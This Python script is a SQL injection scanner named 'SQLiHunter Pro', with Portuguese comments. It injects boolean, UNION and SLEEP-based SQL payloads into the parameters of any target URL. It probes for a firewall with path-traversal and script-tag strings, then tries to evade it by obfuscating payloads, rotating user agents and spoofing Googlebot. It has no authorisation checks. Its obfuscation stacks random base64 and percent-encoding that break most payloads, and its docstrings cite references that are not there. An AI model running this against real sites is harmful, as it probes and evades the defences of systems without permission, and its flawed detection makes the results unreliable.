#!/usr/bin/env python3
"""
SQLiHunter Pro - Advanced SQL Injection Scanner
Versão: 3.3 (com melhorias de detecção de Blind SQLi)
"""

import argparse
import requests
import random
import sys
import re
import base64
import json
from urllib.parse import urlparse, parse_qs
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor
import difflib
import time
from datetime import datetime

# Initialize Colorama
init(autoreset=True)

class EnhancedSQLiScanner:
    def __init__(self, args):
        self.url = args.url
        self.method = args.method.upper()
        self.start_time = datetime.now()
        
        # Parameter initialization
        parsed_url = urlparse(self.url)
        if args.params:
            self.params = self.parse_input(args.params)
        else:
            self.params = self.parse_input(parsed_url.query) if self.method == 'GET' else {}

        self.cookies = self.parse_cookies(args.cookies) if args.cookies else {}
        self.headers = self.parse_headers(args.headers) if args.headers else {}
        self.delay = args.delay
        self.timeout = args.timeout
        self.verbose = args.verbose
        self.proxies = {'http': args.proxy, 'https': args.proxy} if args.proxy else {}
        self.threads = args.threads
        self.waf_detected = False
        self.user_agents = self.load_user_agents()
        self.session = requests.Session()
        self.session.proxies.update(self.proxies)
        self.found_vulnerabilities = []
        self.tech_stack = {}
        self.cve_db = self.load_cve_db()
        
        self.test_stats = {
            'parameters_tested': 0,
            'payloads_sent': 0,
            'vulnerabilities_found': 0
        }

    def log(self, message, level='INFO'):
        timestamp = datetime.now().strftime('%H:%M:%S')
        colors = {
            'INFO': Fore.BLUE,
            'WARNING': Fore.YELLOW,
            'CRITICAL': Fore.RED,
            'ERROR': Fore.MAGENTA
        }
        print(f"{Fore.CYAN}[{timestamp}]{colors[level]}[{level}]{Style.RESET_ALL} {message}")

    def parse_input(self, input_str):
        # Converte em dicionário caso existam parâmetros
        return {k: v[0] for k, v in parse_qs(input_str).items()} if input_str else {}

    def parse_cookies(self, cookie_str):
        # Separa cookies por "; " e formata em dicionário
        return dict(c.split('=', 1) for c in cookie_str.split('; ') if '=' in c) if cookie_str else {}

    def parse_headers(self, header_str):
        """
        Ajustado para analisar cada cabeçalho individualmente, 
        ao invés de usar 'if ':' in header_str', que causaria problemas
        """
        return dict(h.split(':', 1) for h in header_str.split('; ') if ':' in h) if header_str else {}

    def load_user_agents(self):
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Googlebot/2.1 (+http://www.google.com/bot.html)'
        ]

    def load_cve_db(self):
        try:
            with open('cve_db.json', 'r') as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            self.log("CVE database not found/invalid", 'WARNING')
            return {}

    def detect_technology(self, response):
        self.tech_stack = {
            'server': response.headers.get('Server', 'Unknown'),
            'language': 'PHP' if 'PHP' in response.headers.get('X-Powered-By', '') else 'Unknown',
            'framework': 'Unknown'
        }

        if 'django' in response.text.lower():
            self.tech_stack['framework'] = 'Django'
        elif 'laravel' in response.text.lower():
            self.tech_stack['framework'] = 'Laravel'

        self.log(
            f"Technology detected - Server: {self.tech_stack['server']} | "
            f"Language: {self.tech_stack['language']} | Framework: {self.tech_stack['framework']}"
        )

    def waf_detection(self):
        test_payloads = ["' OR 1=1; --", "<script>alert(1)</script>", "../../etc/passwd"]
        self.log("Testing for WAF/IPS protection")
        
        for payload in test_payloads:
            response = self.send_request(payload, "waf_test")
            if response and (response.status_code == 403 or 'captcha' in response.text.lower()):
                self.log("WAF detected", 'WARNING')
                return True
        return False

    def obfuscate_payload(self, payload):
        techniques = [
            lambda x: x.replace(' ', '/**/'),
            lambda x: base64.b64encode(x.encode()).decode(),
            lambda x: ''.join([f'%{ord(c):02x}' for c in x]),
            lambda x: x.upper() if random.choice([True, False]) else x.lower()
        ]
        for _ in range(3):
            payload = random.choice(techniques)(payload)
        return payload

    def send_request(self, payload, param_name):
        # Adiciona delay caso especificado
        if self.delay:
            time.sleep(self.delay)

        target_params = self.params.copy()
        # Garante que o param_name exista
        if param_name not in target_params:
            target_params[param_name] = ''

        target_params[param_name] += self.obfuscate_payload(payload)
        headers = {**self.headers, 'User-Agent': random.choice(self.user_agents)}

        try:
            start_time = time.time()
            if self.method == 'GET':
                response = self.session.get(
                    self.url,
                    params=target_params,
                    cookies=self.cookies,
                    headers=headers,
                    timeout=self.timeout,
                    allow_redirects=False
                )
            else:
                response = self.session.post(
                    self.url,
                    data=target_params,
                    cookies=self.cookies,
                    headers=headers,
                    timeout=self.timeout,
                    allow_redirects=False
                )
            response.elapsed = time.time() - start_time
            self.test_stats['payloads_sent'] += 1
            return response
        except Exception as e:
            if self.verbose:
                self.log(f"Request error: {str(e)}", 'ERROR')
            return None

    def analyze_response(self, response, original_response):
        """
        Compara algumas características para identificar possíveis diferenças
        na resposta da aplicação, auxiliando no processo de detecção
        de SQL injection, inclusive blind [2][3].
        """
        diff = difflib.ndiff(
            original_response.text.splitlines(),
            response.text.splitlines()
        )
        return {
            'status_diff': response.status_code != original_response.status_code,
            'time_diff': abs(response.elapsed - original_response.elapsed),
            'length_diff': abs(len(response.text) - len(original_response.text)),
            'diff_text': '\n'.join(diff)
        }

    def detect_boolean_based_injection(self, response_true, response_false):
        """
        Detecta injeção booleana (boolean-based) conferindo diferenças relevantes 
        entre as respostas para condições sempre verdadeiras e sempre falsas [4][5].
        """
        if not response_true or not response_false:
            return False
        # Se o status code difere muito ou o tamanho da resposta difere, pode indicar injeção
        if response_true.status_code != response_false.status_code:
            return True
        if abs(len(response_true.text) - len(response_false.text)) > 50:
            return True
        return False

    def detect_time_based_injection(self, response_base, response_test):
        """
        Detecta injeção time-based conferindo diferenças 
        no tempo de resposta [2][3].
        """
        if not response_base or not response_test:
            return False
        # Se o tempo de resposta do teste for muito maior que o tempo normal
        # ex.: > 2 ou 3 segundos de diferença
        return (response_test.elapsed - response_base.elapsed) > 2

    def test_injection(self, param):
        self.test_stats['parameters_tested'] += 1
        self.log(f"Testing parameter: {param}", 'INFO')

        # Obtem resposta "limpa" para comparação
        original_response = self.send_request('', param)
        if not original_response:
            return

        self.detect_technology(original_response)

        # Payloads tradicionais (Error, Boolean, Union, Time-based)
        # Adicionamos verificação de blind (boolean e time) [2][3][4].
        boolean_payload_true = "' OR 1=1 --"
        boolean_payload_false = "' OR 1=2 --"
        time_payload = "' OR IF(1=1, SLEEP(5), 0) --"

        # Enviando a requisição com payload booleano verdadeiro
        response_bool_true = self.send_request(boolean_payload_true, param)
        # Enviando a requisição com payload booleano falso
        response_bool_false = self.send_request(boolean_payload_false, param)
        # Enviando a requisição com payload time-based
        response_time_test = self.send_request(time_payload, param)

        # Detecta injection booleana
        if self.detect_boolean_based_injection(response_bool_true, response_bool_false):
            self.report_vulnerability(
                param,
                "Blind Boolean-based SQLi",
                f"{boolean_payload_true} / {boolean_payload_false}"
            )

        # Detecta injection time-based
        if self.detect_time_based_injection(original_response, response_time_test):
            self.report_vulnerability(
                param,
                "Blind Time-based SQLi",
                time_payload
            )

        # Testes complementares: error-based, union-based etc.
        # (poderíamos adicionar mais payloads se desejado)
        generic_payloads = [
            ("' OR 1=1 --", "Boolean-based (genérico)"),
            ("' UNION SELECT NULL,NULL,NULL --", "Union-based"),
            ("' OR SLEEP(2) --", "Time-based (genérico)")
        ]
        for payload, payload_type in generic_payloads:
            test_response = self.send_request(payload, param)
            if test_response:
                analysis = self.analyze_response(test_response, original_response)
                # Critérios simples de detecção
                if analysis['status_diff'] or analysis['time_diff'] > 2 or analysis['length_diff'] > 50:
                    self.report_vulnerability(param, payload_type, payload)

    def report_vulnerability(self, param, vuln_type, payload):
        self.log(f"Vulnerability found in parameter: {param}", 'CRITICAL')
        self.found_vulnerabilities.append({
            'parameter': param,
            'type': vuln_type,
            'payload': payload
        })
        self.test_stats['vulnerabilities_found'] += 1

        print(f"\n{Fore.RED}=== VULNERABILITY FOUND ===")
        print(f"Parameter: {param}")
        print(f"Type: {vuln_type}")
        print(f"Payload: {payload}")
        print(f"============================={Style.RESET_ALL}\n")

    def scan(self):
        self.log("Starting security scan")
        self.log(f"Target URL: {self.url}")
        self.log(f"HTTP Method: {self.method}")

        # Verifica se há WAF
        if self.waf_detection():
            self.log("Activating WAF bypass techniques", 'INFO')

        params = list(self.params.keys())
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(self.test_injection, params)

        self.print_summary()

    def print_summary(self):
        duration = datetime.now() - self.start_time
        print(f"\n{Fore.CYAN}=== SCAN SUMMARY ===")
        print(f"Duration: {duration.total_seconds():.2f}s")
        print(f"Parameters tested: {self.test_stats['parameters_tested']}")
        print(f"Payloads sent: {self.test_stats['payloads_sent']}")
        print(f"Vulnerabilities found: {self.test_stats['vulnerabilities_found']}")
        print(f"{Fore.GREEN}Scan completed{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(description='SQLiHunter Pro - SQL Injection Scanner')
    parser.add_argument('--url', required=True, help='Target URL')
    parser.add_argument('--method', default='GET', choices=['GET', 'POST'], help='HTTP method (GET ou POST)')
    parser.add_argument('--params', help='Parâmetros adicionais (Ex: "user=root&pass=123")')
    parser.add_argument('--cookies', help='Cookies da requisição')
    parser.add_argument('--threads', type=int, default=10, help='Número de threads')
    parser.add_argument('--delay', type=float, default=0.5, help='Atraso entre requisições (segundos)')
    parser.add_argument('--proxy', help='Proxy server (Ex: http://127.0.0.1:8080)')
    parser.add_argument('--timeout', type=float, default=10, help='Tempo máximo de timeout em segundos')
    parser.add_argument('--verbose', action='store_true', help='Habilita saída verbosa')
    parser.add_argument('--headers', help='Cabeçalhos adicionais no formato "Header1:Valor1; Header2:Valor2"')

    args = parser.parse_args()

    if not args.url.startswith('http'):
        args.url = f'http://{args.url}'

    try:
        scanner = EnhancedSQLiScanner(args)
        scanner.scan()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Scan interrupted by user{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == '__main__':
    main()
